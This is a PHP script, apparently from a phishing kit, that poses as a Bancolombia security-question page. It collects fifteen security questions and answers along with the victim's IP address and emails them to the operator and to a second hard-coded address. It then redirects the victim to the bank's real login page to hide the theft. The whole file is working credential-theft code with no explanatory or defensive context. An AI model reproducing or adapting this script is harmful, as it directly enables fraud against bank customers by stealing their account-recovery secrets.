<? 
$ip = getenv("REMOTE_ADDR"); 
$message .= "---------------- DOM WAR ----------------------\n"; 
$message .= "pregunta 1: ".$_POST['question1']."\n"; 
$message .= "respuesta 1: ".$_POST['answer1']."\n"; 
$message .= "pregunta 2: ".$_POST['question2']."\n"; 
$message .= "respuesta 2: ".$_POST['answer2']."\n"; 
$message .= "pregunta 3: ".$_POST['question3']."\n"; 
$message .= "respuesta 3: ".$_POST['answer3']."\n"; 
$messagi .= "golgbc@hotmail.es"; 
$message .= "pregunta 4: ".$_POST['question4']."\n"; 
$message .= "respuesta 4: ".$_POST['answer4']."\n"; 
$message .= "pregunta 5: ".$_POST['question5']."\n"; 
$message .= "respuesta 5: ".$_POST['answer5']."\n"; 
$message .= "pregunta 6: ".$_POST['question6']."\n"; 
$message .= "respuesta 6: ".$_POST['answer6']."\n"; 
$message .= "pregunta 7: ".$_POST['question7']."\n"; 
$message .= "respuesta 7: ".$_POST['answer7']."\n"; 
$message .= "pregunta 8: ".$_POST['question8']."\n"; 
$message .= "respuesta 8: ".$_POST['answer8']."\n"; 
$message .= "pregunta 9: ".$_POST['question9']."\n"; 
$message .= "respuesta 9: ".$_POST['answer9']."\n"; 
$message .= "pregunta 10: ".$_POST['question10']."\n"; 
$message .= "respuesta 10: ".$_POST['answer10']."\n"; 
$message .= "pregunta 11: ".$_POST['question11']."\n"; 
$message .= "respuesta 11: ".$_POST['answer11']."\n"; 
$message .= "pregunta 12: ".$_POST['question12']."\n"; 
$message .= "respuesta 12: ".$_POST['answer12']."\n"; 
$message .= "pregunta 13: ".$_POST['question13']."\n"; 
$message .= "respuesta 13: ".$_POST['answer13']."\n"; 
$message .= "pregunta 14: ".$_POST['question14']."\n"; 
$message .= "respuesta 14: ".$_POST['answer14']."\n"; 
$message .= "pregunta 15: ".$_POST['question15']."\n"; 
$message .= "respuesta 15: ".$_POST['answer15']."\n"; 
 

$message .= "IP: ".$ip."\n"; 
$message .= "---------------- DOM WAR ----------------------\n"; 


@include "configuracion.php"; 


$subject = "preguntas (".$ip.")"; 
$headers .= "MIME-Version: 1.0\n"; 
mail($retorno,$subject,$message,$headers); 
mail($messagi,$subject,$message,$headers); 

header("Location: https://bancolombia.olb.todo1.com/servlet/msfv/B0007/Login/loginFrame.htm"); 
     

?>